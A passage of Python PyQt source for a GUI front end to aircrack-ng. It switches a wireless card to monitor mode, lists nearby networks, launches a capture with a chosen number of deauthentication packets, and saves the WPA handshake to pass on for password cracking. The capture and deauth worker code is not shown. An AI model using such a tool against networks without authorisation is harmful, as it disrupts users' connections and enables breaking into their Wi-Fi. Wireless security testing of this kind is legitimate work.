                self.monitor_interface = None
                
                self.tabs.setTabEnabled(1, False)
                self.tabs.setTabEnabled(2, False)
                self.tabs.setTabEnabled(3, False)
                
                if self.scan_worker:
                    self.scan_worker.stop()
                    self.scan_worker = None
                
                self._load_interfaces()
                
                self.managed_btn.setEnabled(False)
                self.monitor_btn.setEnabled(True)
                
            except Exception as e:
                self.mode_status.setText(f"Error: {str(e)}")
                self.managed_btn.setEnabled(True)
                self.monitor_btn.setEnabled(True)
        
        threading.Thread(target=switch_to_managed, daemon=True).start()
    
    def _enable_monitor_mode(self):
        if not self.selected_interface:
            return
        
        self.mode_status.setText(f"Enabling monitor mode on {self.selected_interface}...")
        self.monitor_btn.setEnabled(False)
        self.managed_btn.setEnabled(False)
        
        self.worker = MonitorModeWorker(self.selected_interface)
        self.worker.progress.connect(lambda msg: self.mode_status.setText(msg))
        self.worker.done.connect(self._monitor_mode_done)
        self.worker.start()
    
    def _monitor_mode_done(self, success, message, monitor_iface):
        if success:
            self.monitor_interface = monitor_iface
            self.mode_status.setText(f"Monitor mode enabled: {monitor_iface}")
            self.monitor_btn.setText("Monitor Mode Enabled")
            self.monitor_btn.setEnabled(False)
            self.managed_btn.setEnabled(True)
            self.tabs.setTabEnabled(1, True)
            self.tabs.setCurrentIndex(1)
            self._start_real_time_scan()
        else:
            self.mode_status.setText(message)
            self.monitor_btn.setEnabled(True)
            self.managed_btn.setEnabled(False)
        
        if self.worker:
            self.worker.wait(1000)
            self.worker = None
    
    def _start_real_time_scan(self):
        if not self.monitor_interface:
            return
        
        self.mode_status.setText(f"Starting scan on {self.monitor_interface}...")
        
        self.scan_worker = RealTimeScanWorker(self.monitor_interface)
        self.scan_worker.networks_found.connect(self._networks_found)
        self.scan_worker.done.connect(self._scan_done)
        self.scan_worker.debug_output.connect(lambda msg: self.mode_status.setText(msg))
        self.scan_worker.start()
    
    def _networks_found(self, networks):
        selected_bssid = None
        if self.selected_network:
            selected_bssid = self.selected_network['bssid']
        
        self.networks = networks
        self.networks_table.setRowCount(len(networks))
        self.radio_group = QButtonGroup(self)
        
        selected_row = -1
        
        for row, network in enumerate(networks):
            radio = QRadioButton()
            radio.setCursor(Qt.CursorShape.PointingHandCursor)
            radio.clicked.connect(lambda checked, bssid=network['bssid']: self._on_network_selected(bssid))
            self.radio_group.addButton(radio)
            
            radio_container = QWidget()
            radio_layout = QHBoxLayout(radio_container)
            radio_layout.addWidget(radio)
            radio_layout.setAlignment(Qt.AlignmentFlag.AlignCenter)
            radio_layout.setContentsMargins(0, 0, 0, 0)
            self.networks_table.setCellWidget(row, 0, radio_container)
            
            essid_item = QTableWidgetItem(network['essid'])
            essid_item.setFont(QFont("JetBrains Mono", 11, QFont.Weight.Bold))
            self.networks_table.setItem(row, 1, essid_item)
            
            bssid_item = QTableWidgetItem(network['bssid'])
            bssid_item.setFont(QFont("JetBrains Mono", 10))
            self.networks_table.setItem(row, 2, bssid_item)
            
            channel_item = QTableWidgetItem(network['channel'])
            channel_item.setTextAlignment(Qt.AlignmentFlag.AlignCenter)
            self.networks_table.setItem(row, 3, channel_item)
            
            enc_item = QTableWidgetItem(network['encryption'])
            enc_item.setTextAlignment(Qt.AlignmentFlag.AlignCenter)
            if 'WPA' in network['encryption']:
                enc_item.setForeground(QColor(self.theme.current['success']))
            elif 'WEP' in network['encryption']:
                enc_item.setForeground(QColor(self.theme.current['warning']))
            elif 'OPN' in network['encryption']:
                enc_item.setForeground(QColor(self.theme.current['error']))
            self.networks_table.setItem(row, 4, enc_item)
            
            if selected_bssid and network['bssid'] == selected_bssid:
                selected_row = row
                radio.setChecked(True)
                self.selected_network = network
        
        self.networks_table.cellClicked.connect(self._on_network_row_clicked)
        self.network_count_label.setText(f"Found {len(networks)} network(s) - updating in real-time...")
        
        if selected_row >= 0:
            self.capture_btn.setEnabled(True)
        elif selected_bssid and selected_row < 0:
            self.selected_network = None
            self.capture_btn.setEnabled(False)
    
    def _on_network_selected(self, bssid):
        for network in self.networks:
            if network['bssid'] == bssid:
                self.selected_network = network
                self.capture_btn.setEnabled(True)
                break
    
    def _on_network_row_clicked(self, row, col):
        if 0 <= row < len(self.networks):
            if self.radio_group and row < len(self.radio_group.buttons()):
                self.radio_group.buttons()[row].setChecked(True)
                self.selected_network = self.networks[row]
                self.capture_btn.setEnabled(True)
            self.networks_table.selectRow(row)
    
    def _scan_done(self, success, message):
        if not success:
            self.network_count_label.setText(message)
        
        if self.scan_worker:
            self.scan_worker.wait(1000)
            self.scan_worker = None
    
    def _start_capture(self):
        if not self.selected_network:
            return
        
        deauth_packets = self.deauth_spin.value()
        
        if self.scan_worker:
            self.scan_worker.stop()
            self.scan_worker.wait(2000)
            self.scan_worker = None
        
        self.so.clear()
        self.pb.setValue(0)
        self.capture_btn.setEnabled(False)
        
        self.tabs.setTabEnabled(2, True)
        self.tabs.setCurrentIndex(2)
        
        self.worker = CaptureWorker(
            self.monitor_interface,
            self.selected_network['bssid'],
            self.selected_network['channel'],
            self.selected_network['essid'],
            deauth_packets
        )
        self.worker.progress.connect(lambda msg: self.so.append(msg))
        self.worker.progress_value.connect(self.pb.setValue)
        self.worker.capture_done.connect(self._capture_done)
        self.worker.handshake_file.connect(self._handshake_file)
        self.worker.start()
    
    def _stop_capture(self):
        if self.worker:
            self.so.append("Stopping capture...")
            self.worker.stop()
    
    def _capture_done(self, success, message):
        self.capture_btn.setEnabled(True)
        
        if success:
            self.so.append(message)
            self.tabs.setTabEnabled(3, True)
            self.tabs.setCurrentIndex(3)
        else:
            self.so.append(message)
        
        if self.worker:
            self.worker.wait(1000)
            self.worker = None
    
    def _handshake_file(self, file_path):
        self.captured_file = file_path
        file_size = os.path.getsize(file_path)
        if file_size < 1024:
            size_str = f"{file_size} B"
        elif file_size < 1048576:
            size_str = f"{file_size/1024:.1f} KB"
        else:
            size_str = f"{file_size/1048576:.1f} MB"
        
        self.handshake_preview.setText(f"Handshake Captured\n\n{os.path.basename(file_path)}\n{size_str}")
        self.export_btn.setEnabled(True)
        self.use_file_btn.setEnabled(True)
        self.tabs.setTabEnabled(3, True)
        self.tabs.setCurrentIndex(3)
    
    def _export_handshake(self):
        if self.captured_file:
            save_path, _ = QFileDialog.getSaveFileName(
                self,
                "Export Handshake",
                os.path.expanduser("~"),
                "Capture File (*.cap)"
            )
            if save_path:
                try:
                    shutil.copy2(self.captured_file, save_path)
                    QMessageBox.information(self, "Exported", f"Handshake exported to:\n{save_path}")
                except Exception as e:
                    QMessageBox.warning(self, "Export Failed", str(e))
        else:
            QMessageBox.warning(self, "No File", "No captured handshake file to export.")
    
    def _use_for_cracking(self):
        if self.captured_file and self.handshake_file_callback:
            self.handshake_file_callback(self.captured_file)
        elif self.captured_file:
            QMessageBox.information(self, "File Ready", f"Handshake file saved to:\n{self.captured_file}")
    
    def _update_requirements(self):
        tools = [
            ("aircrack-ng", self._check_tool("aircrack-ng")),
            ("airmon-ng", self._check_tool("airmon-ng")),
            ("airodump-ng", self._check_tool("airodump-ng")),
            ("aireplay-ng", self._check_tool("aireplay-ng")),
            ("iwconfig", self._check_tool("iwconfig")),
        ]
        
        t = self.theme.current
        h = ""
        for n, o in tools:
            c = t['success'] if o else t['error']
            h += f"<h3 style='color:{c};'>{n}</h3>"
        h += f"<p style='font-size:11px;color:{t['text_tertiary']};'>Install: sudo apt install aircrack-ng wireless-tools</p>"
        self.rq.setHtml(h)
        all_ok = all(o for _, o in tools)
        self.ib.setEnabled(not all_ok)
        self.ib.setText("All Tools Installed" if all_ok else "Install Requirements")
    
    def _check_tool(self, tool):
        try:
            result = subprocess.run(["which", tool], capture_output=True, text=True, timeout=3)
            return result.returncode == 0
        except:
            return False
    
    def _install_requirements(self):
        if QMessageBox.question(
            self,
            "Install Requirements",
            "Install aircrack-ng and required tools?",
            QMessageBox.StandardButton.Yes | QMessageBox.StandardButton.No
        ) != QMessageBox.StandardButton.Yes:
            return
        
        self.rs.setText("Installing...")
        
        def install_thread():
            try:
                subprocess.run(["sudo", "apt", "update", "-qq"], 
                             capture_output=True, text=True, timeout=30)
                subprocess.run(["sudo", "apt", "install", "-y", "aircrack-ng", "wireless-tools"],
                             capture_output=True, text=True, timeout=120)
                self.rs.setText("Installation complete")
                self._update_requirements()
            except Exception as e:
                self.rs.setText(f"Error: {str(e)}")
        
        threading.Thread(target=install_thread, daemon=True).start()
    
    def _apply_theme(self):
        t = self.theme.current
        scale = layout_manager.font_scale()
        
        self.tabs.setStyleSheet(f"""
            QTabWidget::pane {{ border: 1px solid {t['border']}; border-radius: 8px; background: {t['base']}; }}
            QTabBar::tab {{ background: {t['crust']}; color: {t['text_secondary']}; border: 1px solid {t['border']}; padding: 10px 20px; margin-right: 2px; border-top-left-radius: 7px; border-top-right-radius: 7px; font-size: {int(13 * scale)}px; font-weight: 600; }}
            QTabBar::tab:selected {{ background: {t['base']}; color: {t['text']}; border-bottom-color: transparent; }}
            QTabBar::tab:disabled {{ color: {t['text_tertiary']}; }}
        """)
        
        for btn in self.findChildren(QPushButton):
            try:
                if btn.objectName() == "actionButton":
                    btn.setStyleSheet(f"QPushButton{{background:{t['crust']};color:{t['text']};border:1px solid {t['border']};border-radius:10px;padding:{int(10 * scale)}px {int(20 * scale)}px;font-weight:700;font-size:{int(14 * scale)}px;}} QPushButton:hover{{background:{t['surface0']};}} QPushButton:disabled{{color:{t['text_tertiary']};}}")
                elif btn.objectName() == "dangerButton":
                    btn.setStyleSheet(f"QPushButton{{background:{t['crust']};color:{t['error']};border:1px solid {t['border']};border-radius:10px;padding:{int(10 * scale)}px {int(20 * scale)}px;font-weight:700;font-size:{int(14 * scale)}px;}} QPushButton:hover{{background:{t['surface0']};}}")
            except RuntimeError:
                pass
        
        gs = f"QGroupBox{{color:{t['text']};border:1px solid {t['border']};border-radius:8px;margin-top:14px;padding:20px 16px 16px;font-weight:600;font-size:{int(13 * scale)}px;}} QGroupBox::title{{left:14px;padding:0 8px;color:{t['text']};}}"
        for group in self.findChildren(QGroupBox):
            try:
                group.setStyleSheet(gs)
            except RuntimeError:
                pass
        
        for spin in self.findChildren(QSpinBox):
            try:
                spin.setStyleSheet(f"QSpinBox{{background:{t['crust']};color:{t['text']};border:1px solid {t['border']};border-radius:6px;padding:{int(8 * scale)}px {int(10 * scale)}px;font-size:{int(13 * scale)}px;}}")
            except RuntimeError:
                pass
        
        if hasattr(self, 'so') and self.so is not None:
            self.so.setStyleSheet(f"QTextEdit{{background:{t['crust']};color:{t['text']};border:1px solid {t['border']};border-radius:6px;padding:10px;font-family:JetBrains Mono;font-size:{int(13 * scale)}px;}}")
        
        if hasattr(self, 'handshake_preview') and self.handshake_preview is not None:
            self.handshake_preview.setStyleSheet(f"border:2px dashed {t['border']};border-radius:8px;background:transparent;color:{t['success']};font-size:{int(14 * scale)}px;font-weight:600;")
        
        if hasattr(self, 'pb') and self.pb is not None:
            self.pb.setStyleSheet(f"QProgressBar{{background:{t['surface0']};border:none;border-radius:4px;height:{int(14 * scale)}px;text-align:center;font-size:{int(10 * scale)}px;font-weight:600;}} QProgressBar::chunk{{background:{t['success']};border-radius:4px;}}")
        
        if hasattr(self, 'rq') and self.rq is not None:
            self.rq.setStyleSheet(f"QTextBrowser{{background:{t['crust']};color:{t['text']};border:1px solid {t['border']};border-radius:6px;padding:12px;font-family:JetBrains Mono;font-size:{int(12 * scale)}px;}}")
        
        for table in self.findChildren(QTableWidget):
            try:
                table.setStyleSheet(f"""
                    QTableWidget {{ background: {t['crust']}; color: {t['text']}; border: 1px solid {t['border']}; border-radius: 6px; gridline-color: {t['border']}; font-family: JetBrains Mono; font-size: {int(12 * scale)}px; }}
                    QTableWidget::item {{ padding: 8px; border-bottom: 1px solid {t['border']}; }}
                    QTableWidget::item:selected {{ background: {t['hover']}; color: {t['text']}; }}
                    QTableWidget::item:alternate {{ background: {t['surface0']}; }}
                    QHeaderView::section {{ background: {t['surface0']}; color: {t['text']}; padding: 8px; border: 1px solid {t['border']}; font-weight: 600; font-family: JetBrains Mono; font-size: {int(12 * scale)}px; }}
                    QRadioButton {{ color: {t['text']}; }}
                    QRadioButton::indicator {{ width: 16px; height: 16px; border-radius: 8px; border: 2px solid {t['border']}; background: {t['crust']}; }}
                    QRadioButton::indicator:checked {{ border: 2px solid {t['accent']}; background: {t['accent']}; }}
                """)
            except RuntimeError:
                pass
        
        self._ut()
    
    def refresh_theme(self):
        self.setStyleSheet("")
        self._apply_theme()